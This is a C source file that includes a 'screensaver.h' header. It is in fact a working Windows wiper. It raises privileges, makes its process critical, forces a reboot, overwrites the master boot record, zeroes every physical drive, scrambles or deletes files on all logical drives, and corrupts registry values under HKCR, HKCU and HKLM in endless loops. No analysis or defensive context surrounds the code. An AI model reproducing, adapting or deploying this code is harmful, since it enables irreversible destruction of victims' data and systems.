#include "screensaver.h"

BOOL AdjustPrivileges()
{
	BOOL bSuccess = FALSE;

	HMODULE hNtdll = LoadLibraryW(L"ntdll.dll");
	if (!hNtdll) return FALSE;

	RtlAdjustPrivilege_pdef RtlAdjustPrivilege = (RtlAdjustPrivilege_pdef)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
	if (!RtlAdjustPrivilege) goto cleanup;

	BOOLEAN bWasEnabled;
	LUID luid;

	if (!LookupPrivilegeValueW(NULL, SE_SHUTDOWN_NAME, &luid)) goto cleanup;
	if (RtlAdjustPrivilege(luid.LowPart, TRUE, FALSE, &bWasEnabled)) goto cleanup;

	if (!LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &luid)) goto cleanup;
	if (RtlAdjustPrivilege(luid.LowPart, TRUE, FALSE, &bWasEnabled)) goto cleanup;

	bSuccess = TRUE;
	goto cleanup;

cleanup:
	FreeLibrary(hNtdll);
	return bSuccess;
}

BOOL SetAsCritical()
{
	BOOL bSuccess = FALSE;

	HMODULE hNtdll = LoadLibraryW(L"ntdll.dll");
	if (!hNtdll) return FALSE;

	RtlSetProcessIsCritical_pdef RtlSetProcessIsCritical = (RtlSetProcessIsCritical_pdef)GetProcAddress(hNtdll, "RtlSetProcessIsCritical");
	if (!RtlSetProcessIsCritical) goto cleanup;

	if (RtlSetProcessIsCritical(TRUE, NULL, FALSE)) goto cleanup;

	bSuccess = TRUE;
	goto cleanup;

cleanup:
	FreeLibrary(hNtdll);
	return bSuccess;
}

BOOL Reboot()
{
	BOOL bSuccess = FALSE;

	HMODULE hNtdll = LoadLibraryW(L"ntdll.dll");
	if (!hNtdll) return FALSE;

	NtShutdownSystem_pdef NtShutdownSystem = (NtShutdownSystem_pdef)GetProcAddress(hNtdll, "NtShutdownSystem");
	if (!NtShutdownSystem) goto cleanup;

	if (NtShutdownSystem(ShutdownReboot)) goto cleanup;

	bSuccess = TRUE;
	goto cleanup;

cleanup:
	FreeLibrary(hNtdll);
	return bSuccess;
}

DWORD WINAPI DriveCorruptionThread(LPVOID lv)
{
	CloseHandle(QuickCreateThread(DriveFileSystemCorruptionThread, NULL));

	for (INT i = 0; i < 128; i++)
	{
		WCHAR* szDrive = (WCHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_PATH * sizeof(WCHAR));
		if (!szDrive) continue;

		swprintf_s(szDrive, MAX_PATH, L"\\\\.\\PhysicalDrive%d", i);

		CloseHandle(QuickCreateThread(DriveSectorCorruptionThread, (LPVOID)szDrive));
	}

	lv; return 0;
}

DWORD WINAPI DriveFileSystemCorruptionThread(LPVOID lv)
{
	for (;;)
	{
		WCHAR szDrives[128];
		GetLogicalDriveStringsW(128, szDrives);

		WCHAR* pszDrive = szDrives;
		while (*pszDrive)
		{
			CorruptDirectory(pszDrive);
			pszDrive += lstrlenW(pszDrive) + 1;
		}
	} lv;
}

DWORD WINAPI DriveSectorCorruptionThread(LPVOID lv)
{
	WCHAR* szDrive = (WCHAR*)lv;

	HANDLE hDrive = CreateFileW(szDrive, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	HeapFree(GetProcessHeap(), 0, szDrive);

	if (hDrive == INVALID_HANDLE_VALUE) return 0;

	for (;;)
	{
		LARGE_INTEGER li = { 0 };
		li.QuadPart = 0;

		SetFilePointerEx(hDrive, li, NULL, FILE_BEGIN);

		CHAR chBuffer[512];
		RtlZeroMemory(chBuffer, sizeof(chBuffer));

		DWORD dwBytesWritten;
		WriteFile(hDrive, chMbrData, 512, &dwBytesWritten, NULL);

		while (GetLastError() != ERROR_HANDLE_EOF)
			WriteFile(hDrive, chBuffer, 512, &dwBytesWritten, NULL);
	}
}

BOOL CorruptDirectory(LPWSTR lpszDirectory)
{
	if (!lpszDirectory || lpszDirectory[0] == L'\0') return FALSE;

	WCHAR szSearch[MAX_PATH] = { 0 };
	swprintf_s(szSearch, MAX_PATH, L"%s*.*", lpszDirectory);

	WIN32_FIND_DATAW findData;
	HANDLE hFile = FindFirstFileW(szSearch, &findData);

	if (hFile == INVALID_HANDLE_VALUE) return FALSE;
	do
	{
		if (!lstrcmpiW(findData.cFileName, L".") || !lstrcmpiW(findData.cFileName, L"..")
			|| (findData.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT)) continue;

		WCHAR szPath[MAX_PATH];
		swprintf_s(szPath, MAX_PATH, L"%s%s", lpszDirectory, findData.cFileName);

		if (!lstrcmpiW(PathFindExtensionW(szPath), L".ttf"))
			continue;

		if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			lstrcatW(szPath, L"\\");
			if (!CorruptDirectory(szPath)) RemoveDirectoryW(szPath);
			continue;
		}
		else
		{
			if (!(Xorshift32() % 64))
			{
				DeleteFileW(szPath);
				continue;
			}

			WCHAR szFileData[256];
			GetRandomChars(szFileData, _countof(szFileData));

			HANDLE hCurrentFile = CreateFileW(szPath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
			if (hCurrentFile == INVALID_HANDLE_VALUE) continue;

			DWORD dwBytesWritten;
			if (WriteFile(hCurrentFile, szFileData, sizeof(szFileData), &dwBytesWritten, NULL))
				SetEndOfFile(hCurrentFile);

			CloseHandle(hCurrentFile);
		}
	} while (FindNextFileW(hFile, &findData));

	FindClose(hFile);
	return TRUE;
}

DWORD WINAPI RegistryCorruptionThread(LPVOID lv)
{
	for (;;)
	{
		CorruptRegistryKey(HKEY_CLASSES_ROOT, 0);
		CorruptRegistryKey(HKEY_CURRENT_USER, 0);
		CorruptRegistryKey(HKEY_LOCAL_MACHINE, 0);
	} lv;
}

BOOL CorruptRegistryKey(HKEY hKey, INT nDepth)
{
	if (nDepth > 20) return FALSE;

	LSTATUS lStatus = 0;

	for (DWORD i = 0; lStatus != ERROR_NO_MORE_ITEMS; i++)
	{
		WCHAR szValueName[16383];
		DWORD dwValueNameSize = _countof(szValueName);
		DWORD dwType;
		
		lStatus = RegEnumValueW(hKey, i, szValueName, &dwValueNameSize, NULL, &dwType, NULL, NULL);
		if (lStatus != ERROR_SUCCESS) continue;

		switch (dwType)
		{
		case REG_DWORD:
		{
			DWORD dwValue = Xorshift32();
			RegSetValueExW(hKey, szValueName, 0, REG_DWORD, (const BYTE*)&dwValue, sizeof(DWORD));
			break;
		}
		case REG_SZ:
		{
			WCHAR szValue[256];
			GetRandomChars(szValue, _countof(szValue));

			RegSetValueExW(hKey, szValueName, 0, REG_SZ, (const BYTE*)szValue, (lstrlenW(szValue) + 1) * 2);
			break;
		}
		default:
			RegDeleteValueW(hKey, szValueName);
			break;
		}

		RegFlushKey(hKey);
	}

	lStatus = 0;
	for (DWORD i = 0; lStatus != ERROR_NO_MORE_ITEMS; i++)
	{
		WCHAR szKeyName[255];
		DWORD dwKeyNameSize = _countof(szKeyName);

		lStatus = RegEnumKeyExW(hKey, i, szKeyName, &dwKeyNameSize, NULL, NULL, NULL, NULL);

		HKEY hNextKey;
		if (!RegOpenKeyExW(hKey, szKeyName, 0, KEY_QUERY_VALUE | KEY_ENUMERATE_SUB_KEYS | KEY_SET_VALUE, &hNextKey))
		{
			CorruptRegistryKey(hNextKey, nDepth + 1);
			RegCloseKey(hNextKey);
		}
		else continue;
	}

	return TRUE;
}